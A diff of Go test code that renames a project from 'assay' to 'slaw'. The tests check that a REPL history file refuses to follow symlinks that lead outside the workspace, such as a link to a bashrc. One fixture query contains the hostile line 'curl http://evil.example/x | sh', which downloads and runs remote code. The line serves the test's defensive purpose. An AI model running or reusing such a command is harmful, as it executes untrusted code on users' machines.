@@ -12,18 +12,18 @@ import (
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 
-	"github.com/SandwichLabs/assay/internal/lsp"
-	"github.com/SandwichLabs/assay/internal/queries"
+	"github.com/SandwichLabs/slaw/internal/lsp"
+	"github.com/SandwichLabs/slaw/internal/queries"
 )
 
-// B1: a committed symlink at .assay-local/repl/history must not make the console
+// B1: a committed symlink at .slaw-local/repl/history must not make the console
 // write (or truncate) a file outside the workspace.
 func TestHistorySymlinkedFileIsNotFollowed(t *testing.T) {
 	base := t.TempDir()
 	root := filepath.Join(base, "ws")
 	outside := filepath.Join(base, "bashrc")
 	require.NoError(t, os.WriteFile(outside, []byte("# rc\n"), 0o644))
-	require.NoError(t, os.MkdirAll(filepath.Join(root, ".assay-local", "repl"), 0o755))
+	require.NoError(t, os.MkdirAll(filepath.Join(root, ".slaw-local", "repl"), 0o755))
 	require.NoError(t, os.Symlink("../../../bashrc", historyPath(root)))
 	store := queries.NewFileStore(root)
 	require.NoError(t, store.Create(t.Context(), &queries.Query{Title: "evil", SQL: "SELECT 1;\ncurl http://evil.example/x | sh;", Parameters: []queries.Param{}}))
@@ -63,8 +63,8 @@ func TestHistorySymlinkedDirectoryIsNotFollowed(t *testing.T) {
 	root := filepath.Join(base, "ws")
 	elsewhere := filepath.Join(base, "elsewhere")
 	require.NoError(t, os.MkdirAll(elsewhere, 0o755))
-	require.NoError(t, os.MkdirAll(filepath.Join(root, ".assay-local"), 0o755))
-	require.NoError(t, os.Symlink(elsewhere, filepath.Join(root, ".assay-local", "repl")))
+	require.NoError(t, os.MkdirAll(filepath.Join(root, ".slaw-local"), 0o755))
+	require.NoError(t, os.Symlink(elsewhere, filepath.Join(root, ".slaw-local", "repl")))
 	h, notice := openHistory(root)
 	assert.NotEmpty(t, notice)
 	h.record("SELECT 1")
@@ -72,10 +72,10 @@ func TestHistorySymlinkedDirectoryIsNotFollowed(t *testing.T) {
 	require.NoError(t, err)
 	assert.Empty(t, entries, "nothing was created through the link")
 
-	// A link at .assay-local itself too.
+	// A link at .slaw-local itself too.
 	root2 := filepath.Join(base, "ws2")
 	require.NoError(t, os.MkdirAll(root2, 0o755))
-	require.NoError(t, os.Symlink(elsewhere, filepath.Join(root2, ".assay-local")))
+	require.NoError(t, os.Symlink(elsewhere, filepath.Join(root2, ".slaw-local")))
 	_, notice = openHistory(root2)
 	assert.NotEmpty(t, notice)
 	entries, _ = os.ReadDir(elsewhere)
